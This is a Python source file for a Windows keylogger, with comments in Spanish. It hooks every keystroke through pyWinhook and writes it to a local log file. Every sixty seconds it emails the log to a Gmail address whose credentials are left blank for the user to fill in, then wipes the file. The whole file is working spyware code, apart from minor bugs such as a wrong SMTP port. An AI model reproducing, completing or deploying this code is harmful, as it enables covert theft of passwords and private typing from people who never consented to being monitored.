# Python 3.8.2 64-bit Interpreter

import datetime
import time

import logging
# import pythoncom
import pyWinhook
import smtplib

wait_seconds = 60
timeout = time.time() + wait_seconds
file_log = './data/dat.txt'


def timeOut():
    if time.time() > timeout:
        return True
    else:
        return False


def sendEmail(user, pwd, recipient, subject, body):
    gmail_user = user
    gmail_pass = pwd
    sender = user
    addressee = recipient if type(recipient) is list else [recipient]
    subject = subject
    text = body

    message = """From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (sender, ", ".join(addressee), subject, text)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 578)
        server.ehlo()
        server.starttls()
        server.login(gmail_user, gmail_pass)
        server.sendmail(sender, addressee, message)
        server.close()
        print("Todo correcto, y yo que me alegro")
    except:
        print("Esto se va a poner feo")


def formatAndSendEmail():
    with open(file_log, 'r+') as f:
        actual_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace('\n', '')
        data = 'Log capturado a las: ' + actual_date + '\n' + data
        sendEmail('', '', '', 'Nuevo log - ' + actual_date, data)  # Complete the fields

        f.seek(0)
        f.truncate(0)


def onKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    logging.log(10, chr(event.Ascii))
    return True


hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = onKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if timeOut():
        formatAndSendEmail()
        timeout = time.time() + wait_seconds

    # Solucionar problema de la función
    # pythoncom.PumpWaitingMessages()
